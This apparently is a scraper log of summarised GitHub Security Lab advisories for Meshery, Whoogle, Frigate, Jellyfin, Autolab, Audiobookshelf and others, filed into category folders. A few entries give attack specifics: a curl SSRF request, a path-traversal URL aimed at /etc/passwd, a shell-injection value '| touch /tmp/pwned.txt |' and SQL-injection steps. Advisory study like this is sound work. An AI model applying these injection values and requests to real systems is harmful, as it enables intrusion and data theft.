+- **任意文件写入**：利用SQL注入和堆叠查询，可以执行`ATTACH DATABASE`命令。
+- **数据库数据被访问和修改**：攻击者可能访问或修改数据库中存储的任意数据，如性能配置、Meshery应用数据或Kubernetes配置。
+
+## 潜在风险
+
+- 任意数据的读写可能会导致严重问题，这取决于多个因素。
+
+## 重现漏洞
+
+通过以下三条请求，可以在任意位置写入文件，并且文件内容也是任意的（请求中需要使用合适的cookie，例：`Cookie: meshery-provider=None`）：
+
+- **验证文件创建**：
+  
+- **创建任意数据库条目**：可以通过发送请求到特定网址来实现。
+
+- **提取数据库信息**：需要使用盲注（blind SQL injection）技术。例如，可以使用`sqlmap`自动化过程来转储在性能配置中使用的请求cookies。
+
+## 漏洞发现
+
+该问题由GitHub CodeQL团队成员@atorralba (Tony Torralba) 发现，并通过CodeQL的SQL注入查询辅助检测。
+
+如需联系GHSL团队，请发送邮件至securitylab@github.com，并在沟通中提及GHSL-2023-249。
+Folder 'SQL注入' already exists.
+SQL注入
+内容已保存至 SQL注入/GHSL_2023_249_Meshery中的SQL注入漏洞_CVE_2024_29031_6a956d87.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-249_Meshery/
+# Whoogle-Search Vulnerabilities Overview
+
+Whoogle-search has multiple vulnerabilities, including **Server-Side Request Forgery (SSRF)** and **Cross-Site Scripting (XSS)**. These issues are categorized as **CVE-2024-22203**, **CVE-2024-22204**, **CVE-2024-22205**, and **CVE-2024-22417**.
+
+## Key Vulnerabilities
+
+### 1. Server-Side Request Forgery (SSRF)
+- **What is SSRF?**  
+  SSRF allows an attacker to make requests from the server to internal or external resources that the server can access, even if those resources are not publicly available on the internet.
+
+- **How does it occur?**  
+  - In the `element` and `window` methods of `app/routes.py`, user inputs (`src_type`, `element_url`, and `location`) are not properly validated.
+  - These inputs are sent to the `send` method, which executes GET requests (identified in `request.py`) using those inputs.
+
+### 2. Cross-Site Scripting (XSS)
+- **What is XSS?**  
+  XSS vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users.
+
+- **How does it occur?**  
+  - The data returned from the SSRF requests is displayed back to the user without sanitization.
+  - Attackers can craft a URL that points to a malicious site. When users click on this link, they believe it's from a trusted source, as the URL appears legitimate.
+  
+### 3. Limited File Write Vulnerability
+- **What is it?**  
+  This vulnerability lets an attacker write arbitrary data to files on the server, potentially leading to further exploitation.
+
+- **How does it occur?**  
+  - The function `config` in `app/routes.py` allows user input to manipulate file paths insecurely.
+  - User data is saved to files without proper checks, and the application can be tricked into overwriting existing files.
+
+## Summary
+
+These vulnerabilities can lead to significant security risks, allowing attackers to:
+- Access internal services not meant for public access (via SSRF).
+- Execute malicious scripts in the user’s browser (via XSS).
+- Write arbitrary data into server files (limited file write).
+
+### Reporting
+
+These issues were discovered by **Sylwia Budzynska** from the GHSL team. For more information, you can contact the GHSL team at **securitylab@github.com**, referencing the specific vulnerability codes.
+Folder 'SSRF' created.
+SSRF
+内容已保存至 SSRF/Whoogle_Search_Vulnerabilities_Overview_5c69f17f.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-186_GHSL-2023-189_benbusby_whoogle-search/
+# GHSL-2023-190: Frigate中的多个漏洞 - CVE-2023-45672, CVE-2023-45671, CVE-2023-45670
+
+## 概述
+Frigate软件存在几个安全漏洞，允许攻击者执行恶意代码或进行XSS攻击。以下是详细说明：
+
+## 漏洞详情
+
+### 1. 不当的日志访问控制
+- **问题**: 在`logs/<service>`接口中，用户可以请求特定服务的日志（如nginx、go2rtc、frigate）。如果用户指定的服务不存在，系统应该返回错误，但实际上却返回未处理的HTML内容。
+- **影响**: 攻击者可以注入JavaScript payload，造成跨站脚本(XXS)攻击。
+
+### 2. 代码执行漏洞
+- **路径**: 通过`frigate/http.py`接收用户输入，接下来在`frigate/config.py`解析输入。
+- **问题**: 输入通过`yaml.loader.Loader`处理，如果提供恶意payload，将直接执行。
+- **影响**: 可能导致未经认证的远程代码执行（RCE）。
+
+### 3. 反射型XSS漏洞
+- **问题**: `recording_clip`请求处理器根据请求的摄像头名称返回字符串，由于未转义，可能引发反射型XSS。
+- **举例**: 通过请求一个不存在的摄像头，从而制造返回未处理的输入，允许JavaScript代码执行。
+
+### 4. 缺少CSRF保护
+- **问题**: `config_save`和`config_set`请求处理器没有CSRF保护，可以接收任意来源的请求来更改配置。
+- **影响**: 允许未授权更新Frigate服务器的配置，可能导致拒绝服务和数据泄露。
+
+### 5. 用户控制的错误信息
+- **问题**: 返回的错误信息内容类型为text/html，且参数完全由用户控制，未经过滤。
+- **影响**: 攻击者可以构造恶意URL，并注入XSS payload。
+
+## 结论
+这些漏洞可能导致严重的安全问题，包括代码执行和信息泄露。GHSL团队成员@maclarel和@jorgectf发现并报告了这些问题。
+
+### 联系我们
+如需更多信息或报告相关问题，请通过邮件联系GHSL团队：securitylab@github.com，并请在邮件中提及GHSL-2023-190等相关参考编号。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2023_190_Frigate中的多个漏洞_CVE_2023_45672_CVE_76f371ea.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-190_Frigate/
+# Mealie 安全漏洞概述
+
+## 漏洞信息
+Mealie 版本 1.0.0-RC1.1 存在多个服务器端请求伪造（SSRF）和拒绝服务（DoS）漏洞。这些漏洞使得攻击者能够：
+- 识别并访问 Mealie 本地网络上的 web 服务器
+- 对目标发起拒绝服务攻击
+
+## 技术背景
+### SSRF（服务器端请求伪造）
+- Mealie 的 `safe_scrape_html` 函数允许用户提供 URL 来向远程服务器发起请求。这些请求没有限制，可使用任意 IP 地址。
+- 当请求返回任何响应时，攻击者可确认本地网络中的 HTTP 服务器。
+
+### DoS（拒绝服务）
+- `safe_scrape_html` 和 `scrape_image` 两个函数没有实施请求速率限制，可能导致 CPU 资源耗尽。
+- 如果向 Mealie 请求大型文件（例如 ISO 文件），可以使容器 CPU 达到满载，导致服务不可用。
+
+## 安全风险
+1. **请求内容的处理**:
+   - 用户提供的 URL 不被验证，可能指向本地或恶意的资源。
+   - 向 Mealie 发送不存在的资源请求时，可能会返回错误消息，但攻击者可以利用这些信息来确认资源是否存在。
+
+2. **资源耗尽**:
+   - 攻击者可以持续向 Mealie 发起大量请求，导致 CPU 和内存耗尽，最终导致服务崩溃。
+
+3. **文件存储和访问**:
+   - Mealie 在请求图像时，未限制资源请求路径，可能导致敏感文件被意外下载和存储。
+   - 有管理员权限的用户可以访问和下载这些文件，增加安全隐患。
+
+## 预防措施
+- **限制用户请求**: 对用户输入的 URL 进行验证，确保只能访问授权的外部资源。
+- **实施速率限制**: 对请求限制频率，以防止恶意用户发起 DoS 攻击。
+- **加强用户权限管理**: 确保只有授权用户才能访问和操作敏感数据。
+
+## 联系方式
+若需了解更多信息，请联系 GHSL 团队: securitylab@github.com，并提及 GHSL-2023-225, GHSL-2023-226, GHSL-2023-227 或 GHSL-2023-228 。
+Folder 'SSRF' already exists.
+SSRF
+内容已保存至 SSRF/Mealie_安全漏洞概述_1eb5d55e.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-225_GHSL-2023-226_Mealie/
+# OpenMetadata 远程代码执行漏洞总结
+
+OpenMetadata 存在多个安全漏洞，主要涉及 SpEL 表达式注入和身份验证绕过，这些漏洞可能导致远程代码执行（RCE）。
+
+## 漏洞概述
+
+### 1. SpEL 表达式注入
+
+- **影响版本**: OpenMetadata 1.2.2
+- **漏洞路径**: 
+  - `AlertUtil::validateExpression`
+  - `CompiledRule::validateExpression`
+- **漏洞细节**: 
+  1. 这两个方法通过 `StandardEvaluationContext` 评估用户控制的 SpEL 表达式，允许访问 Java 类（如 `java.lang.Runtime`），从而执行任意系统命令。
+  2. 受影响的 API 端点 `/api/v1/events/subscriptions/validation/condition/<expression>` 和 `/api/v1/policies/validation/condition/<expression>`。
+
+### 2. 身份验证绕过
+
+- **概述**: 
+  - 使用 JWT 进行 API 身份验证，某些端点可以不进行身份验证（列在 `EXCLUDED_ENDPOINTS` 中）。
+  - 攻击者可以构造请求，以绕过身份验证，触发上述的漏洞。
+
+## 漏洞链分析
+
+### 漏洞链1：事件订阅
+
+- **请求路径**: `PUT /api/v1/events/subscriptions`
+- **调用链**:
+  - `EventSubscriptionResource.createOrUpdateEventSubscription` 
+  - → `EntityResource.createOrUpdate`
+  - → `EntityRepository.prepareInternal`
+  - → `AlertUtil::validateExpression`
+  
+- **缺失的授权**: `Authorizer.authorize()` 在执行 SpEL 表达式后调用，未能阻止未经授权的访问。
+
+### 漏洞链2：策略规则
+
+- **请求路径**: `PUT /api/v1/policies`
+- **调用链**:
+  - `PolicyResource.createOrUpdate`
+  - → `EntityRepository.prepareInternal`
+  - → `CompiledRule::validateExpression`
+
+- **缺失的授权**: 类似于事件订阅，授权检查后执行了 SpEL 表达式评估。
+
+## 建议
+
+- **使用 SimpleEvaluationContext**: 为了防止 RCE，建议不使用 `StandardEvaluationContext`，即使是管理员也不应执行任意系统命令。
+- **加强身份验证**: 所有端点均应有效执行 JWT 验证，避免潜在的身份验证绕过。
+
+## 联系方式
+
+如需报告或咨询，联系 GHSL 团队：[securitylab@github.com](mailto:securitylab@github.com)，并提及相关漏洞编号 GHSL-2023-235, GHSL-2023-236, GHSL-2023-237, GHSL-2023-251, GHSL-2023-252。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/OpenMetadata_远程代码执行漏洞总结_bd155cd6.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-235_GHSL-2023-237_Open_Metadata/
+# Bazarr 漏洞概述: CVE-2023-50264, CVE-2023-50265, CVE-2023-50266
+
+Bazarr 存在多个漏洞，主要包括未授权的任意文件读取和盲目服务器端请求伪造（SSRF）。
+
+## 漏洞详细信息
+
+1. **未授权的任意文件读取**
+    - **漏洞位置**: `/system/backup/download/` 端点
+    - **问题描述**: Bazarr 没有验证用户输入的文件名，通过 `send_file` 函数读取任意文件。
+    - **影响版本**: v1.2.4
+    - **检测方法**: 使用 CodeQL 查询识别的“未控制的数据用于路径表达式”。
+   
+2. **另一个文件读取漏洞**
+    - **漏洞位置**: `/api/swaggerui/static` 端点
+    - **问题描述**: 同样，用户输入的文件名未经过验证，允许任意文件读取。
+    - **检测方法**: 使用 CodeQL 查询识别的“未控制的数据用于路径表达式”。
+
+3. **盲目服务器端请求伪造（SSRF）**
+    - **漏洞位置**: `proxy` 方法
+    - **问题描述**: Bazarr 未验证用户输入的协议和 URL，直接将其传递给 `requests.get()`，造成服务器端请求伪造。请求的响应内容对于请求者是不可见的。
+    - **风险**: 可能用于探测内部网络中的资源，即使它们在互联网上不可访问。
+
+## 示例
+攻击者可以通过请求一个不存在的文件（如 `foo.txt`）来判断其是否存在：
+- 响应信息表明文件是否存在。
+
+## 联系信息
+漏洞由 GHSL 团队成员 @sylwia-budzynska 发现并报告。如需进一步信息，请联系 GHSL 团队：securitylab@github.com，邮件中请引用 GHSL-2023-192，GHSL-2023-193 或 GHSL-2023-194。
+Folder '任意文件读写漏洞' already exists.
+任意文件读写漏洞
+内容已保存至 任意文件读写漏洞/Bazarr_漏洞概述_CVE_2023_50264_CVE_2023_50265_CVE_2_13925ca8.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-192_GHSL-2023-194_bazarr/
+# GHSL-2024-027_GHSL-2024-028: Codeium-Chrome 扩展的 API 滥用 - CVE-2024-28120
+
+## 概述
+Codeium-Chrome 扩展存在一个安全漏洞，具体表现为其服务工作者在接收外部消息时没有验证消息的发送者。这意味着攻击者可以利用此漏洞获取用户的 Codeium API 密钥，从而冒充用户在后台自动完成功能上进行操作。
+
+## 关键技术点
+- **服务工作者**：Codeium-Chrome 扩展中的一部分，它负责处理后台任务和消息。
+- **外部消息**：指的是来自其他网站或扩展的消息。
+- **API 密钥**：用于身份验证的密钥，允许用户与 Codeium 自动填写服务器进行交互。
+
+## 漏洞细节
+- **版本**：受影响的扩展版本为 v1.2.52。
+- **信息泄露**：攻击者可以通过未验证的外部消息获取用户的用户名、API 密钥及其他配置信息。
+- **利用方式**：攻击者只需创建一个含有特定 JavaScript 代码的网页，即可向 Codeium-Chrome 扩展发送消息并显示 API 密钥和用户名。
+
+## 安全建议
+- 开发者需要在服务工作者中添加发送者验证逻辑，以防止未授权访问。
+  
+## 报告与联系
+- 该漏洞由 GHSL 团队成员 @Kwstubbs (Kevin Stubbings) 发现并报告。
+- 如需更多信息，请联系 GHSL 团队: securitylab@github.com，并在沟通中提及 GHSL-2024-027。
+Folder '信息泄露' already exists.
+信息泄露
+内容已保存至 信息泄露/GHSL_2024_027_GHSL_2024_028_Codeium_Chrome_扩展的_AP_f1060593.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2024-027_GHSL-2024-028_codeium-chrome/
+# Notepad++ Buffer Overflow Vulnerabilities
+
+## 概述
+Notepad++ 存在多个缓冲区溢出漏洞，影响版本为 **v8.5.2**。这些漏洞可能导致任意代码执行。
+
+## 技术细节
+
+### 1. CVE-2023-40031
+- **问题：** `Utf8_16_Read::convert` 函数在转换 UTF16 到 UTF8 时，计算的新缓冲区大小错误。
+- **原因：** 输入长度为奇数时，计算不正确。例如，当输入长度为 9，计算新大小为 14，但偏移量导致读取越界。
+- **复现步骤：**
+  1. 编译 Notepad++ 的 ASAN 版本。
+  2. 打开特制文件以触发越界访问。
+
+### 2. CVE-2023-40036
+- **问题：** 由于索引越界，读取超过全局分配的对象缓冲区。
+- **原因：** 输入文件内容导致数组索引超出 `mCharToFreqOrder` 的大小。
+- **复现步骤：**
+  1. 编译 ASAN 版本或设置断点。
+  2. 打开特制文件以触发越界访问。
+
+### 3. CVE-2023-40164
+- **问题：** 数组索引 `byteCls` 超出 `charLenTable` 的大小。
+- **原因：** 输入文件内容设置的索引超出了有效范围。
+- **复现步骤：**
+  1. 编译 ASAN 版本或设置条件断点。
+  2. 打开特制文件以触发越界访问。
+
+### 4. CVE-2023-40166
+- **问题：** 文件加载时超出数据缓冲区的末尾读取。
+- **原因：** 无法正确检查读取的字节长度。
+- **复现步骤：**
+  1. 为 `notepad++.exe` 启用页面堆。
+  2. 创建特制文件并尝试打开以触发问题。
+
+## 联系信息
+如果您有任何关于这些问题的疑问，可以联系 GHSL 团队：[securitylab@github.com](mailto:securitylab@github.com)，并提供相关的 GHSL 编号（如 GHSL-2023-092 等）。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/Notepad_Buffer_Overflow_Vulnerabilities_0f0baa39.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-092_Notepad__/
+# GHSL-2023-185: Posthog中的服务器端请求伪造（SSRF） - CVE-2023-46746
+
+## 什么是SSRF？
+
+服务器端请求伪造（SSRF）是一种安全漏洞，攻击者可以利用它从服务器发送伪造的请求。这通常会导致敏感信息泄露或对内部系统的攻击。
+
+## 问题描述
+
+在Posthog的某个版本（1.43.1）中，发现了一个可以被经过身份验证的用户利用的SSRF漏洞。
+
+具体问题在于，`posthog/api/user.py`文件中的`test_slack_webhook`方法没有正确验证用户提供的webhook变量。这使得恶意用户可以利用这个变量，导致Posthog服务器发送错误的POST请求。
+
+这个漏洞是通过CodeQL的请求伪造查询发现的。
+
+## 风险
+
+通过这个SSRF漏洞，攻击者可以伪造从PostHog服务器发送的POST请求，可能会影响系统的安全性。
+
+## 报告人
+
+此问题由GHSL团队成员@Sylwia Budzynska发现并报告。
+
+## 联系信息
+
+如果需要进一步咨询，请联系GHSL团队，邮件地址为: securitylab@github.com。在任何相关沟通中，请提及GHSL-2023-185。
+Folder 'SSRF' already exists.
+SSRF
+内容已保存至 SSRF/GHSL_2023_185_Posthog中的服务器端请求伪造_SSRF_CVE_2023_2886b669.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-185_posthog_posthog/
+# GHSL-2022-018: Apache Commons Text中的任意代码执行漏洞 - CVE-2022-42889
+
+## 概述
+
+在Apache Commons Text版本1.9中，有一个安全漏洞，可能会导致任意代码执行。这是由于**StringSubstitutor**类的默认插值器造成的。
+
+## 技术细节
+
+- **StringSubstitutor**：这个类用于字符串替换，功能强大，但使用时需要小心。
+- **默认插值器**：通过`StringSubstitutor.createInterpolator()`创建的插值器存在安全隐患。
+  
+### 漏洞说明
+
+- 当不可信的数据被传入`StringSubstitutor.replace()`或`StringSubstitutor.replaceIn()`方法时，攻击者可以利用**ScriptStringLookup**功能进行恶意代码执行。
+- 这可能导致*远程代码执行*(RCE)，即攻击者能够在受害者的系统上运行任意代码。
+
+## 发现与报告
+
+此问题由GHSL团队成员@pwntester（Alvaro Muñoz）发现和报告。
+
+如需更多信息或支持，请联系GHSL团队：securitylab@github.com，并在沟通中提到GHSL-2022-018。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2022_018_Apache_Commons_Text中的任意代码执行漏洞_CVE_9c01b4bb.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/
+# GHSL-2023-121: SAML身份验证绕过漏洞（CVE-2023-48703）
+
+## 概述
+在RobotsAndPencils的go-saml库中发现了一个SAML身份验证绕过漏洞。这个问题可能导致使用go-saml进行SAML断言签名验证的应用程序出现身份验证绕过。
+
+> **注意:** go-saml库已被标记为归档状态，不再维护。仍在使用该库的项目应考虑迁移到其他SAML库，或从项目中去除SAML支持。
+
+## 漏洞细节
+- **问题来源**: 在内部调用xmlsec1命令行工具以验证SAML断言的签名时，未明确指定受支持的公钥数据。这意味着攻击者可以自己签署SAML断言并在SAML令牌中嵌入所需的公钥（如RSA密钥）。
+  
+- **代码流**: 使用go-saml的应用程序调用`Validate`方法来验证SAML响应。该方法将调用`VerifyResponseSignature`，进一步调用xmlsec.go中的`verify`函数。这里使用的xmlsec1工具没有参数限制，这导致它会考虑XML文件中嵌入的公钥。
+
+### 受影响的调用：
+- `VerifyResponseSignature`
+- `Validate`（在`authnresponse.go`中）
+- `VerifyRequestSignature`
+- `Validate`（在`authnrequest.go`中）
+
+## 暂时解决方案
+如果项目仍然使用go-saml库，可以通过以下方式进行临时修复：
+- 分叉go-saml项目，向`verify`函数中添加命令行参数`--enabled-key-data`，并指定例如`x509`或`raw-x509-cert`作为值，调用xmlsec1工具。
+
+> **注意:** 此临时解决方案必须经过仔细测试。
+
+## 版本信息
+- 2024年1月发布的xmlsec1版本1.3.3默认禁用了KeyValue和DEREncodedKeyValue XML节点。然而，大多数Linux发行版使用的是旧版本的xmlsec1，因此建议在任何情况下都指定`enabled-key-data`。
+
+## 建议
+强烈推荐从go-saml库迁移到其他库，因为该库已不再维护。
+
+## 联系方式
+如需帮助，请联系GHSL团队，邮箱地址为securitylab@github.com，邮件中请引用GHSL-2023-121以便于沟通。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2023_121_SAML身份验证绕过漏洞_CVE_2023_48703_33d2e8cc.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-121_go-saml__archived_/
+# GHSL-2023-028: Jellyfin中的远程代码执行漏洞 - CVE-2023-48702
+
+## 概述
+在jellyfin服务器上，一位拥有管理员权限的用户可以通过`/System/MediaEncoder/Path`接口执行任意代码。
+
+## 技术细节
+
+- **接口与函数**: 
+  - `/System/MediaEncoder/Path`接口能够执行任意文件，这是通过`ProcessStartInfo`和`ValidateVersion`函数实现的。
+  
+- **利用路径**:
+  - 恶意管理员可以设置网络共享并提供一个指向网络共享上可执行文件的UNC路径，从而使jellyfin服务器在本地上下文中运行该可执行程序。
+
+## 漏洞利用示例
+
+1. **身份验证问题**:
+   - 使用curl工具直接访问`/System/MediaEncoder/Path`时遇到了一些身份验证问题，因此建议使用web用户界面进行操作。
+
+2. **上传恶意文件**:
+   - `/Branding/Splashscreen`接口无法严格验证文件类型。它根据请求头中指定的内容类型创建文件扩展名，但未检查文件本身的类型。
+   - 可以通过指定有效的内容类型（例如`image/png`）来上传可执行文件。
+
+3. **结合漏洞**:
+   - 将上述两个漏洞结合，恶意用户可以利用`/System/MediaEncoder/Path`接口实现远程代码执行（RCE）。
+
+## 风险
+此漏洞可能导致在身份验证后进行远程代码执行。
+
+## 报告人
+此问题由GHSL团队成员@Kwstubbs（Kevin Stubbings）发现并报告。
+
+## 联系方式
+如需进一步联系GHSL团队，请通过securitylab@github.com发送邮件，并在沟通中提及GHSL-2023-028或GHSL-2023-029。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2023_028_Jellyfin中的远程代码执行漏洞_CVE_2023_48702_78c5b946.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-028_jellyfin/
+# GHSL-2023-145_GHSL-2023-151/GHSL-2023-165_GHSL-2023-172: 关于stb_image和stb_vorbis库的内存访问漏洞
+
+## 概述
+在`stb_image.h`和`stb_vorbis`库中发现了多个不同严重程度的内存访问漏洞，这些问题可能导致信息泄漏、服务拒绝、或代码执行。
+
+### 受影响的库版本
+- `stb_image` - v2.28
+- `stb_vorbis` - v1.22
+
+## 漏洞描述
+
+### 1. 内存泄漏
+- **问题**: 当使用`stbi_set_flip_vertically_on_load`设置为`TRUE`且`req_comp`与实际像素分量数量不匹配时，可能导致越界的内存读取。
+- **原因**: 内部计算的行字节数与实际图像尺寸不符，导致读取超出分配的内存区域。
+
+### 2. double-free漏洞
+- **问题**: `stbi__load_gif_main`函数可能试图释放未分配的内存。
+- **场景**: 在处理图像层时，当层的步幅为零时，可能触发重复释放的尝试，这在多线程环境中尤为危险。
+
+### 3. 空指针访问
+- **问题**: 如果某些函数返回了空指针，代码会继续执行并试图访问该指针。
+- **后果**: 这可能导致程序崩溃（服务拒绝）。
+
+### 4. 内存泄漏与重复释放
+- **问题**: `stbi__load_gif_main`函数在失败时可能未能重置内存指针，造成隐蔽的内存泄漏。
+- **后果**: 调用者可能在未处理失败情况下继续释放内存，导致错误的内存管理（重复释放或内存泄漏）。
+
+### 5. 越界写入
+- **问题**: 某些情况下，写入的位置超出了分配的内存区域。
+- **原因**: 由于整数溢出或读取的长度不正确，可能导致向无效地址写入数据。
+- **后果**: 这可能被攻击者利用来执行任意代码。
+
+### 6. 内存分配失败
+- **问题**: 如果在内存分配时遇到失败，部分指针未能被正确初始化或重置。
+- **后果**: 程序可能尝试解引用未初始化的指针，可能导致崩溃。
+
+## 结论
+上述漏洞严重影响了`stb_image`和`stb_vorbis`库的安全性，可能被恶意用户利用。建议用户及时更新到最新版本以防止潜在的安全风险。
+
+## 联系我们
+这些问题是由GHSL团队成员@JarLob发现并报告的。如需了解更多信息，请联系GHSL团队：`securitylab@github.com`，并在通信中提及相关报告编号。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2023_145_GHSL_2023_151_GHSL_2023_165_GHSL_202_37f5c967.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-145_GHSL-2023-151_stb_image_h/
+# GHSL-2023-203_GHSL-2023-204: Audiobookshelf的多个漏洞
+
+**Audiobookshelf** 是一个音频书籍管理系统，当前在其版本 **v2.4.3** 中存在几个安全漏洞，包括：
+
+1. **服务器端请求伪造 (SSRF)**
+2. **任意文件读取 (AFR)**
+3. **任意文件删除 (AFD)**
+
+## 漏洞详情
+
+- **用户权限**：具有更新权限的用户可以：
+  - 读取任意文件
+  - 删除任意文件
+  - 发送GET请求到任意URL并读取响应
+
+### SSRF 漏洞示例
+
+利用 `curl` 命令可以向系统发送请求，从而读取敏感信息：
+
+```bash
+curl -i -s -k -X $'GET' \
+    -H $'Host: localhost:3333' \
+    -H $'Authorization: Bearer <YOUR_TOKEN>' \
+    -H $'Content-Length: 2' \
+    --data-binary $'\x0d\x0a' \
+    $'http://localhost:3333/api/authors/<AUTHOR_ID>/image?token=JWT_TOKEN&raw=true'
+```
+
+### 任意文件删除
+
+任何用户（不论其权限）都可能通过路径遍历漏洞读取本地文件系统中的文件。下载文件的路径需要经过 URL 编码，以避免与正则解析的混淆。这可能导致泄露敏感信息。
+
+### 示例
+
+示例中的 `%2F` 是 URL 编码的斜杠 `/`，通过这类技术可以访问目标文件的完整路径。
+
+## 漏洞报告
+
+这些问题由GHSL团队的成员 **@Kwstubbs (Kevin Stubbings)** 发现，并借助于 CodeQL 的 SSRF 和路径注入查询工具进行检测。
+
+如需联系GHSL团队，请发送邮件至 **securitylab@github.com**，并在相关沟通中提及 **GHSL-2023-203** 或 **GHSL-2023-204**。
+Folder '任意文件读写漏洞' already exists.
+任意文件读写漏洞
+内容已保存至 任意文件读写漏洞/GHSL_2023_203_GHSL_2023_204_Audiobookshelf的多个漏洞_730befc5.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-203_GHSL-2023-204_audiobookshelf/
+# GHSL-2022-100: Autolab中的路径遍历和远程代码执行漏洞
+
+在Autolab中发现了两个漏洞，分别是CVE-2022-41955和CVE-2022-41956。以下是详细介绍：
+
+## Autolab概述
+
+- **版本**：v2.9.0
+- **功能**：允许学生通过“远程提交”功能提交作业。提交的文件来自运行Autolab实例可以访问的路径，通常是在共享驱动器的某个目录内。
+
+## 漏洞描述
+
+### 1. 路径遍历漏洞（CVE-2022-41955）
+
+- **问题**：攻击者可以利用“远程提交”功能提交其他用户的作业。提交时，攻击者可以构造一个URL，包含被攻击者提交目录以外的路径。
+- **结果**：攻击者可以查看或下载敏感文件（如 `/etc/passwd`），这可能导致信息泄露。
+  
+**利用示例**：
+  
+- 攻击者可以发送GET请求，格式如下：
+  ```
+  http://<autolab-url>/submit?submit=<path_to_sensitive_file>
+  ```
+
+### 2. 远程代码执行漏洞（CVE-2022-41956）
+
+- **问题**：Autolab的剽窃检查功能允许教师在某些条件下执行命令。构造的参数没有经过验证，攻击者可以插入恶意命令。例如，在“Max Lines”输入框中输入一个shell命令。
+- **结果**：攻击者可以在Autolab服务器上执行任意命令。
+
+**利用示例**：
+
+- 攻击者在选择作业后，可以输入如下内容：
+  ```
+  | touch /tmp/pwned.txt |
+  ```
+- 这会创建一个名为 `/tmp/pwned.txt` 的文件。
+
+## 如何防护
+
+- 确保对用户输入的参数进行严格的验证和消毒。
+- 检查系统的访问权限，限制哪些用户可以执行敏感操作。
+
+## 联系信息
+
+如果有关于此漏洞的任何问题，请联系GHSL团队，邮箱为: securitylab@github.com，并在沟通中提及GHSL-2022-100。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2022_100_Autolab中的路径遍历和远程代码执行漏洞_de414901.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-100_Autolab/
+# GHSL-2023-004: 任意文件上传和下载漏洞 - CVE-2023-22726
+
+## 漏洞概述
+GitHub Action 的 artifacts 服务器没有对路径输入进行处理，这使得攻击者能够在 GitHub Action 中下载和覆盖主机上的任意文件。
+
+## 受影响的版本
+- **act**: v0.2.35
+
+## 漏洞细节
+1. **上传漏洞**：  
+   - `/upload` 接口存在路径遍历漏洞，用户可以控制文件路径，最终导致调用 `os.Mkdir` 和 `os.Open` 操作。
+
+2. **下载漏洞**：  
+   - `/artifact` 接口同样存在路径遍历漏洞，用户可以控制路径变量，服务器将返回指定的文件。
+
+这些漏洞可能导致特权升级。
+
+## 报告信息
+- 漏洞由 GHSL 团队成员 @Kwstubbs（Kevin Stubbings）发现并报告。
+- 如需联系 GHSL 团队，请发送邮件至 securitylab@github.com，并在邮件中提到 GHSL-2023-004。
+Folder '任意文件读写漏洞' already exists.
+任意文件读写漏洞
+内容已保存至 任意文件读写漏洞/GHSL_2023_004_任意文件上传和下载漏洞_CVE_2023_22726_93b9ed68.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2023-004_act/
+# GHSL-2022-094: Discordrb中的远程代码执行漏洞 - CVE-2023-28102
+
+## 漏洞概述
+在 discordrb 库中，`encode_file` 方法存在安全问题。当这个方法被不可信的用户输入调用时，可能导致远程代码执行（RCE）。
+
+## 技术细节
+- **库版本**: discordrb 3.4.1（最新版本）。
+- **问题来源**: 在 `encoder.rb` 文件中，生成shell命令的方式不安全。如果传入的文件参数包含恶意输入，可能导致命令注入。
+
+## 漏洞影响
+- **利用条件**: 该漏洞不是直接可被利用的，攻击者需要通过调用该方法，并传入恶意用户输入来实现攻击。
+- **攻击后果**: 如果输入不安全，攻击者可以在主机上执行任意shell命令。例如，可以创建一个新文件 `pwned` 在当前工作目录下。
+
+## 漏洞检测
+- 使用 CodeQL 可以检测到这个问题，提示不安全的 shell 命令是如何构建的。
+
+## 报告信息
+- 该漏洞由 GHSL 团队成员 @erik-krogh 发现并报告。
+- 如需联系 GHSL 团队，请发送邮件至 securitylab@github.com，邮件中请注明 GHSL-2022-094 以便于跟踪。
+Folder 'RCE' already exists.
+RCE
+内容已保存至 RCE/GHSL_2022_094_Discordrb中的远程代码执行漏洞_CVE_2023_2810_55b2f6f7.md
+Processed and saved https://securitylab.github.com/advisories/GHSL-2022-094_discordrb/
+# GHSL-2023-139: 使用后释放漏洞 (CVE-2023-3297) 在 accountsservice 中
+
+## 概述
+一个低权限的本地攻击者可以通过向 `accounts-daemon` 进程发送 D-Bus 消息，利用 `accountsservice` 中存在的使用后释放 (Use After Free, UAF) 漏洞。
+
+## 受影响的版本
+- `accountsservice` 版本: 22.08.8-1ubuntu7
+- 漏洞在 Ubuntu 23.04 和 22.04 LTS 中均存在，但在 23.04 上更容易观察到。
+
+## 问题描述
+当 `D-Bus` 服务器接收到方法调用时， 应该只发送 `METHOD_RETURN` 或 `ERROR` 消息，而不能同时发送。`accountsservice` 并未正确遵守这一协议，在多个地方存在这一问题。
+
+### 示例
+在 `user_change_language_authorized_cb` 函数中：
+- 如果 `user_HOME_available` 返回错误，则会调用 `throw_error` 发送 `ERROR` 消息，同时又错误地发送了一个 `METHOD_RETURN` 消息。
+- 这会导致使用后释放的问题，因为 `throw_error` 和 `accounts_user_complete_set_language` 都减少了 `context` 的引用计数。
